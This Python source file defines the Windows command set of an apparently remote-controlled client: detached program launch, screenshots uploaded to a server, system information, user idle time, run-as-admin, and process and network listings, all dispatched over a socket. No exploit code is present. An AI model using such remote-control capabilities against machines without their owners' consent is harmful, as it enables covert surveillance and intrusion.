from client.commands.arguments.decorators import argument_command
from client.commands.common.commands import CommonCommands
from client.commands.runtime.interrupts import timeout
from client.commands.platform.services.win.media_service import WinMediaService
from client.commands.platform.services.win.privilege_service import WinPrivilegeService
from client.commands.platform.services.win.process_service import WinProcessService
from client.commands.platform.services.win.system_service import WinSystemService
from client.commands.platform.specs.common import NETSTAT_ARGUMENT_SPEC, PS_ARGUMENT_SPEC
from core.utils.decorator import desc


class WindowsCommands(CommonCommands):
    """Windows 平台专用命令集合"""

    def __init__(self, socket):
        super().__init__(socket)
        self.win_process = WinProcessService(self)
        self.win_system = WinSystemService(self)
        self.win_media = WinMediaService(self)
        self.win_privilege = WinPrivilegeService(self)

    @desc('Run a program without waiting (detached)', group='shell')
    def run(self, command):
        """
        启动程序但不等待返回（独立运行）
        """
        return self.win_process.run(command)

    # ------------------ 截图 ------------------ #
    @desc('Capture screenshot', group='platform')

    @timeout(30)
    def screenshot(self):
        """
        截图并上传到服务器
        """
        return self.win_media.capture_screenshot()

    # ------------------ 系统信息 ------------------ #
    @desc('Get system information', group='platform')

    @timeout(30)
    def getinfo(self):
        """
        获取 Windows 系统信息
        """
        return self.win_system.collect_system_info()

    # ------------------ 用户空闲时间 ------------------ #
    @desc('Get user idle time', group='platform')

    @timeout(10)
    def idletime(self):
        """
        获取用户空闲时间（秒）
        """
        return self.win_system.get_user_idletime()

    @desc('Run command as admin', group='system')
    def runasadmin(self, command):
        """
        以管理员权限执行命令
        """
        return self.win_privilege.run_as_admin(command)

    @argument_command('netstat', spec=NETSTAT_ARGUMENT_SPEC)
    def _acmd_netstat(self, args_dict, payload=None):
        return self._acmd_netstat_common(args_dict, payload)

    @argument_command('ps', spec=PS_ARGUMENT_SPEC)
    def _acmd_ps(self, args_dict, payload=None):
        return self._acmd_ps_common(args_dict, payload)